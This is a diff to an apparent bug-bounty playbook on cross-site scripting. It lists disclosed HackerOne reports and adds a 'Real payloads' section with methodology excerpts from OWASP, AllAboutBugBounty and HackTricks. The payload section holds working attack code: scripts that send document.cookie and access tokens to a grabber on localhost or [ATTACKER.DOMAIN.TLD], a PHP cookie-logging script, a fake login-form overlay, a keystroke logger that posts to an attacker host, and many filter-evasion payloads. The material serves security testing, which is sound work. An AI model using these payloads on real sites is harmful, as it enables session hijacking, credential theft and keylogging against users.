@@ -1,7 +1,7 @@
 # Real-World Playbook — XSS (Reflected / Stored / DOM)
 
 **Class:** `xss` · **Coverage-matrix tier:** 0 · **Hunter2:** vuln_scanner.sh (dalfox+xsstrike) · /domxss · tools/dom_xss_harness.py · **Skill:** web2-vuln-classes, client-side-security
-**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow)
+**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)
 
 ## Why it pays (real bounty signal)
 Top disclosed XSS reports peak at **$20,000**. Rewarded across: Basecamp, GitLab, PayPal, Reddit, Shopify, TikTok, Uber, Valve.
@@ -9,17 +9,17 @@ Top disclosed XSS reports peak at **$20,000**. Rewarded across: Basecamp, GitLab
 ## How real hackers found it — top disclosed reports
 *(title = the actual technique; open the report for the full PoC)*
 
-- **Bypass for #488147 enables stored XSS on https://paypal.com/signin again** — PayPal, $20,000 · 2682👍 · [510152](https://hackerone.com/reports/510152)
+- **Bypass for #488147 enables stored XSS on https://paypal.com/signin again** — PayPal, $20,000 · 2683👍 · [510152](https://hackerone.com/reports/510152)
 - **Stored XSS on https://paypal.com/signin via cache poisoning** — PayPal, $18,900 · 684👍 · [488147](https://hackerone.com/reports/488147)
 - **Stored XSS in markdown via the DesignReferenceFilter** — GitLab, $16,000 · 316👍 · [1212067](https://hackerone.com/reports/1212067)
-- **Stored XSS via Kroki diagram** — GitLab, $13,950 · 294👍 · [1731349](https://hackerone.com/reports/1731349)
-- **New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields** — GitLab, $13,950 · 92👍 · [1578400](https://hackerone.com/reports/1578400)
-- **XSS at jamfpro.shopifycloud.com** — Shopify, $9,400 · 239👍 · [1444682](https://hackerone.com/reports/1444682)
-- **XSS in steam react chat client** — Valve, $7,500 · 493👍 · [409850](https://hackerone.com/reports/409850)
+- **Stored XSS via Kroki diagram** — GitLab, $13,950 · 295👍 · [1731349](https://hackerone.com/reports/1731349)
+- **New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields** — GitLab, $13,950 · 93👍 · [1578400](https://hackerone.com/reports/1578400)
+- **XSS at jamfpro.shopifycloud.com** — Shopify, $9,400 · 240👍 · [1444682](https://hackerone.com/reports/1444682)
+- **XSS in steam react chat client** — Valve, $7,500 · 495👍 · [409850](https://hackerone.com/reports/409850)
 - **Stored XSS in developer.uber.com** — Uber, $7,500 · 223👍 · [131450](https://hackerone.com/reports/131450)
 - **Stored XSS on any page in most Uber domains** — Uber, $6,000 · 107👍 · [217739](https://hackerone.com/reports/217739)
 - **Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains** — Uber, $6,000 · 51👍 · [256152](https://hackerone.com/reports/256152)
-- **Stored XSS in SVG file as data: url** — Shopify, $5,300 · 150👍 · [1276742](https://hackerone.com/reports/1276742)
+- **Stored XSS in SVG file as data: url** — Shopify, $5,300 · 151👍 · [1276742](https://hackerone.com/reports/1276742)
 - **Stored XSS in /admin/product and /admin/collections** — Shopify, $5,300 · 75👍 · [1147433](https://hackerone.com/reports/1147433)
 - **[accounts.reddit.com] Redirect parameter allows for XSS** — Reddit, $5,000 · 394👍 · [1962645](https://hackerone.com/reports/1962645)
 - **HEY.com email stored XSS** — Basecamp, $5,000 · 359👍 · [982291](https://hackerone.com/reports/982291)
@@ -193,6 +193,256 @@ new class extends confirm``{}
 
 
 ```
+
+## Real payloads
+*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*
+
+### PayloadsAllTheThings
+```
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
+<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
+```
+```
+<?php
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie."\r\n");
+fclose($fp);
+?>
+```
+```
+<script>
+  fetch('https://[ATTACKER.DOMAIN.TLD]', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>
+```
+```
+<script>
+history.replaceState(null, null, '../../../login');
+document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
+</script>
+```
+```
+<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>
+```
+```
+<script>debugger;</script>
+```
+```
+<script>alert(document.domain.concat("\n").concat(window.origin))</script>
+```
+```
+<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
+```
+```
+// Basic payload
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
+
+// Img payload
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<><img src=1 onerror=alert(1)>
+
+// Svg payload
+<svg
+onload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>alert('33')
+<svg><script>alert&lpar;'33'&rpar;
+
+// Div payload
+<div onpointerover="alert(45)">MOVE HERE</div>
+```
+
+## Real attacker flow / methodology
+*(how real hunters approach this class step by step)*
+
+### From OWASP WSTG (testing guide)
+### Reflected Cross Site Scripting
+
+|ID          |
+|------------|
+|WSTG-INJT-01|
+
+#### Summary
+
+Reflected [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) occurs when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.
+
+Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.
+
+When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim's browser.
+
+Commonly the attacker's code is written in the JavaScript language, but other scripting languages such as ActionScript and VBScript can also be used. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).
+
+One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out `<script>`, but might not filter `%3cscript%3e` which simply includes another encoding of tags.
+
+#### Test Objectives
+
+- Identify variables that are reflected in responses.
+- Assess the input they accept and the encoding that gets applied on return (if any).
+
+#### How to Test
+
+##### Black-Box Testing
+
+A black-box test will include at least three phases:
+
+###### Detect Input Vectors
+
+Detect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.
+
+###### Analyze Input Vectors
+
+Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.
+  Some example of such input data are the following:
+
+- `<script>alert(123)</script>`
+- `"><script>alert(document.cookie)</script>`
+
+For a comprehensive list of potential test strings see the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
+
+###### Check Impact
+
+For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.
+
+Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:
+
+- `>` (greater than)
+- `<` (less than)
+- `&` (ampersand)
+- `'` (apostrophe or single quote)
+- `"` (double quote)
+
+However, a full list of entities is defined by the HTML and XML specifications. [Wikipedia has a complete reference](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).
+
+Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:
+
+- `\n` (new line)
+
+*(truncated — open the source link for the full method)*
+
+### From AllAboutBugBounty
+### XSS Cheat Sheet (Basic)
+
+#### Introduction
+Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
+- Reflected XSS
+
+    Attack where the malicious script runs from another website through the web browser    
+- Stored XSS
+  
+    Stored attacks are those where the injected script is permanently stored on the target servers
+- DOM-Based XSS
+
+    A type of XSS that has payloads found in the DOM rather than within the HTML code.
+
+#### Where to find
+This vulnerability can appear in all features of the application. If you want to find Dom-based XSS, you can find it by reading the javascript source code.
+
+#### How to exploit
+1. Basic payload
+```html
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+```
+
+2. Add ' or " to escape the payload from value of an HTML tag
+```html
+"><script>alert(1)</script>
+'><script>alert(1)</script> 
+```
+
+* Example source code
+```html
+<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
+```
+
+* After input the payload
+```html
+<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
+```
+
+3. Add --> to escape the payload if input lands in HTML comments.
+```html
+--><script>alert(1)</script>
+```
+
+* Example source code
+```html
+<!-- REFLECTED_HERE --> 
+```
+
+* After input the payload
+```html
+<!-- --><script>alert(1)</script> -->
+```
+
+4. Add </tag> when the input inside or between opening/closing tags, tag can be ```<a>,<title>,<script>``` and any other HTML tags
+    
+```html
+</tag><script>alert(1)</script>
+"></tag><script>alert(1)</script>
+```
+
+* Example source code
+```html
+<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
+```
+
+* After input the payload
+```html
+<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
+
+*(truncated — open the source link for the full method)*
+
+### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
+### XSS (Cross Site Scripting)
+
+
+#### Methodology
+
+1. Check if **any value you control** (_parameters_, _path_, _headers_?, _cookies_?) is being **reflected** in the HTML or **used** by **JS** code.
+2. **Find the context** where it's reflected/used.
+3. If **reflected**
+   1. Check **which symbols can you use** and depending on that, prepare the payload:
+      1. In **raw HTML**:
+         1. Can you create new HTML tags?
+         2. Can you use events or attributes supporting `javascript:` protocol?
+         3. Can you bypass protections?
+         4. Is the HTML content being interpreted by any client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), you could abuse a [**Client Side Template Injection**](../client-side-template-injection-csti.md).
+         5. If you cannot create HTML tags that execute JS code, could you abuse a [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
+      2. Inside a **HTML tag**:
+         1. Can you exit to raw HTML context?
+         2. Can you create new events/attributes to execute JS code?
+         3. Does the attribute where you are trapped support JS execution?
+         4. Can you bypass protections?
+      3. Inside **JavaScript code**:
+         1. Can you escape the `<script>` tag?
+
+*(truncated — open the source link for the full method)*
 
 ## Chaining — always ask "what does this unlock?"
 - Stored XSS in an admin-viewed field → **admin session/ATO**
